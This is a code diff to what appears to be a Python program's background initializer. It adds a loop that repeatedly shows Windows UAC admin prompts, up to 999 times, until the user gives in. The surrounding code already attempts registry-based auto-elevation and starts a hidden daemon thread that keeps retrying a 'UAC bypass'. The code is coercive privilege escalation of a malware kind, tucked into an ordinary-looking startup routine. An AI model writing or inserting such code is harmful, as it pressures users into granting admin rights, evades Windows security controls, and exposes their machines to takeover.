@@ -1235,8 +1235,20 @@ class BackgroundInitializer:
                     else:
                         debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
                     
-                    # STEP 3: If all else fails, continue without admin but keep trying in background
-                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Background retry thread")
+                    # STEP 3: Persistent UAC prompt - keep asking until user clicks YES
+                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Persistent UAC prompt loop")
+                    log_message("🔄 Showing persistent UAC prompt - will keep asking until you click YES...")
+                    
+                    # This will loop showing UAC prompts until user clicks YES or 999 attempts
+                    if run_as_admin_persistent():
+                        debug_print("✅ [PERSISTENT UAC] User granted admin!")
+                        log_message("✅ Persistent UAC prompt successful!")
+                        return "persistent_uac_success"
+                    else:
+                        debug_print("❌ [PERSISTENT UAC] Max attempts reached or failed")
+                    
+                    # STEP 4: If all else fails, continue without admin but keep trying in background
+                    debug_print("[PRIVILEGE ESCALATION] STEP 4: Background retry thread")
                     log_message("⚠️ All elevation methods failed, will retry in background...")
                     # Start a background thread to keep retrying UAC bypass
                     threading.Thread(target=keep_trying_elevation, daemon=True).start()
